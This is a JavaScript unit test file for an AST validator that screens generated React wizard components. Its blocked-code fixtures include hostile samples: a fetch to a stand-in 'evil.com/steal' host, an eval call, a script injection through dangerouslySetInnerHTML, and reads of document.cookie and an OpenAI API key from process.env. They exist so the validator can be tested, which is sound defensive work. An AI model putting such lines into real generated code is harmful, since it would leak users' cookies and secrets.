/**
 * tests/astTest.js – Unit tests for the AST Validator
 * ─────────────────────────────────────────────────────
 * Runs standalone – no server, no API key required.
 * Usage:  node tests/astTest.js
 *         npm run test:ast
 */

"use strict";

const { validateAST } = require("../astValidator");

// ── Minimal ANSI colour helpers ───────────────────────────────────────────
const GREEN  = (s) => `\x1b[32m${s}\x1b[0m`;
const RED    = (s) => `\x1b[31m${s}\x1b[0m`;
const YELLOW = (s) => `\x1b[33m${s}\x1b[0m`;
const BOLD   = (s) => `\x1b[1m${s}\x1b[0m`;

// ── Test runner ───────────────────────────────────────────────────────────
let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(GREEN(`  ✓ ${name}`));
    passed++;
  } catch (err) {
    console.log(RED(`  ✗ ${name}`));
    console.log(RED(`    → ${err.message}`));
    failed++;
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message ?? "Assertion failed");
}

// ──────────────────────────────────────────────
//  Test cases
// ──────────────────────────────────────────────

console.log(BOLD("\n── AuraGen AST Validator Tests ──\n"));

// ── VALID cases ───────────────────────────────────────────────────────────

console.log(YELLOW("VALID – should pass:\n"));

test("Minimal valid HealedWizard component", () => {
  const code = `
import React, { useState } from 'react';

function HealedWizard({ formFields, currentState, onSubmit }) {
  const [step, setStep] = useState(0);
  return (
    <div className="p-8">
      <h1 className="text-2xl font-bold">Step 1</h1>
      <button onClick={() => onSubmit({})} className="rounded-2xl bg-blue-500 text-white px-4 py-2">
        Submit
      </button>
    </div>
  );
}

export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === true, `Expected valid, got: ${result.error}`);
});

test("Arrow function HealedWizard component", () => {
  const code = `
import React, { useState } from 'react';

const HealedWizard = ({ formFields, currentState, onSubmit }) => {
  const [step, setStep] = useState(0);
  const [values, setValues] = useState(currentState || {});
  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center">
      <div className="bg-white rounded-2xl shadow p-8">
        <p className="text-sm text-gray-500">Step {step + 1} of {formFields.length}</p>
        <button
          onClick={() => onSubmit(values)}
          className="rounded-2xl bg-blue-500 text-white px-6 py-2 mt-4 transition-all duration-200 hover:bg-blue-600"
        >
          Submit
        </button>
      </div>
    </div>
  );
};

export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === true, `Expected valid, got: ${result.error}`);
});

test("Strips markdown fences before parsing", () => {
  const code = `\`\`\`jsx
import React, { useState } from 'react';

function HealedWizard({ onSubmit }) {
  return <div className="p-4"><button onClick={() => onSubmit({})}>Go</button></div>;
}

export default HealedWizard;
\`\`\``;
  const result = validateAST(code);
  assert(result.valid === true, `Expected valid after fence strip, got: ${result.error}`);
});

test("Multi-step wizard with useState", () => {
  const code = `
import React, { useState } from 'react';

function HealedWizard({ formFields, currentState, onSubmit }) {
  const [step, setStep] = useState(0);
  const [values, setValues] = useState(currentState || {});
  const totalSteps = Math.ceil(formFields.length / 2);
  const currentFields = formFields.slice(step * 2, step * 2 + 2);

  const handleNext = () => {
    if (step < totalSteps - 1) setStep(step + 1);
    else onSubmit(values);
  };

  return (
    <div className="min-h-screen bg-blue-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md">
        <p className="text-sm text-gray-400 mb-4">Step {step + 1} of {totalSteps}</p>
        {currentFields.map((field) => (
          <div key={field.name} className="mb-4">
            <label className="block text-gray-700 mb-1">{field.label}</label>
            <input
              type={field.type || 'text'}
              value={values[field.name] || ''}
              onChange={(e) => setValues({ ...values, [field.name]: e.target.value })}
              className="border border-gray-300 rounded-xl px-4 py-2 w-full focus:ring-2 focus:ring-blue-400 outline-none"
              placeholder={field.placeholder || ''}
            />
          </div>
        ))}
        <div className="flex justify-between mt-6">
          {step > 0 && (
            <button
              onClick={() => setStep(step - 1)}
              className="rounded-2xl border border-gray-300 px-6 py-2 text-gray-600 hover:bg-gray-50 transition-all duration-200"
            >
              Back
            </button>
          )}
          <button
            onClick={handleNext}
            className="rounded-2xl bg-blue-500 text-white px-6 py-2 ml-auto hover:bg-blue-600 transition-all duration-200"
          >
            {step < totalSteps - 1 ? 'Next' : 'Submit'}
          </button>
        </div>
      </div>
    </div>
  );
}

export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === true, `Expected valid, got: ${result.error}`);
});

// ── INVALID – Security violations ─────────────────────────────────────────

console.log(YELLOW("\nINVALID – security violations (should be blocked):\n"));

test("Blocks eval()", () => {
  const code = `
import React from 'react';
function HealedWizard() {
  eval('alert(1)');
  return <div />;
}
export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – eval() should be blocked");
  assert(result.error.includes("eval"), `Error should mention eval, got: ${result.error}`);
});

test("Blocks new Function()", () => {
  const code = `
import React from 'react';
function HealedWizard() {
  const fn = new Function('return 1');
  return <div />;
}
export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – new Function() should be blocked");
});

test("Blocks dangerouslySetInnerHTML", () => {
  const code = `
import React from 'react';
function HealedWizard() {
  return <div dangerouslySetInnerHTML={{ __html: '<script>alert(1)</script>' }} />;
}
export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – dangerouslySetInnerHTML should be blocked");
  assert(result.error.includes("dangerouslySetInnerHTML"), `Error should mention the prop, got: ${result.error}`);
});

test("Blocks localStorage", () => {
  const code = `
import React from 'react';
function HealedWizard() {
  localStorage.setItem('key', 'val');
  return <div />;
}
export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – localStorage should be blocked");
});

test("Blocks fetch()", () => {
  const code = `
import React from 'react';
function HealedWizard() {
  fetch('https://evil.com/steal');
  return <div />;
}
export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – fetch() should be blocked");
});

test("Blocks document.cookie", () => {
  const code = `
import React from 'react';
function HealedWizard() {
  const c = document.cookie;
  return <div>{c}</div>;
}
export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – document is blocked");
});

test("Blocks window.location", () => {
  const code = `
import React from 'react';
function HealedWizard() {
  window.location.href = 'https://evil.com';
  return <div />;
}
export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – window is blocked");
});

test("Blocks process.env", () => {
  const code = `
import React from 'react';
function HealedWizard() {
  const key = process.env.OPENAI_API_KEY;
  return <div>{key}</div>;
}
export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – process is blocked");
});

// ── INVALID – Structure violations ────────────────────────────────────────

console.log(YELLOW("\nINVALID – structural violations (should be blocked):\n"));

test("Rejects code without HealedWizard component", () => {
  const code = `
import React from 'react';
function WrongName() {
  return <div>Hello</div>;
}
export default WrongName;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – no HealedWizard component");
  assert(result.error.includes("HealedWizard"), `Error should mention HealedWizard, got: ${result.error}`);
});

test("Rejects code with syntax errors", () => {
  const code = `
import React from 'react';
function HealedWizard() {
  return (<div>  // unclosed JSX
}
export default HealedWizard;
  `;
  const result = validateAST(code);
  assert(result.valid === false, "Expected invalid – syntax error");
  assert(result.error.toLowerCase().includes("syntax") || result.error.toLowerCase().includes("error"),
    `Error should indicate syntax problem, got: ${result.error}`);
});

test("Rejects empty input", () => {
  const result = validateAST("");
  assert(result.valid === false, "Expected invalid – empty input");
});

test("Rejects null input", () => {
  const result = validateAST(null);
  assert(result.valid === false, "Expected invalid – null input");
});

// ──────────────────────────────────────────────
//  Summary
// ──────────────────────────────────────────────

const total = passed + failed;
console.log(`\n${"─".repeat(44)}`);
console.log(BOLD(`Results: ${passed}/${total} passed`));

if (failed > 0) {
  console.log(RED(`         ${failed} test(s) FAILED\n`));
  process.exit(1);
} else {
  console.log(GREEN(`         All tests passed ✓\n`));
  process.exit(0);
}
